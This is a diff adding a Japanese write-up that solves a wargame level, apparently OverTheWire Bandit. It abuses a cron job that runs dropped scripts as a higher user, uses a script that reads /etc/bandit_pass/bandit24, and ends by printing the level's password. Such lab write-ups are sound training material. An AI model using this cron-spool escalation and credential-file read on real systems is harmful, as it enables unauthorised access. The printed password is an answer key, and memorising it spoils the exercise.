@@ -1,0 +1,50 @@
+前回と同様、cronの問題
+
+/etc/cron.d/cronjob_bandit24を見てみると
+
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cronjob_bandit24.shが常時動いているらしい
+
+cat /usr/bin/cronjob_bandit24.sh として中身を見てみると、
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 "./$i"
+        rm -f "./$i"
+     fi
+done
+
+/var/spool/$mynameの中身を、実行して、削除しているらしい
+
+つまりなんとかして、実行させて、/etc/bandit_pass/bandit24 辺りを読みだせば良いのではと思ったので（cronjob_bandit24はbandit24として実行されるため）
+
+/var/spool/bandit24に移動して、tmp.shを作成する
+
+tmp.sh
+
+#!/bin/sh
+
+cat /etc/bandit_pass/bandit24
+
+としたが、うまくいかなかったので
+
+cat /etc/bandit_pass/bandit24 > hoge
+
+と、リダイレクトするようにする
+
+保存して実行権限を与えようとしたらファイルが消されてしまっていたりして苦労したが、なんとかうまいタイミングで実行権限を与えて実行されるまで待つ
+
+すると、hogeが生成されているので、cat hoge でおしまい
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
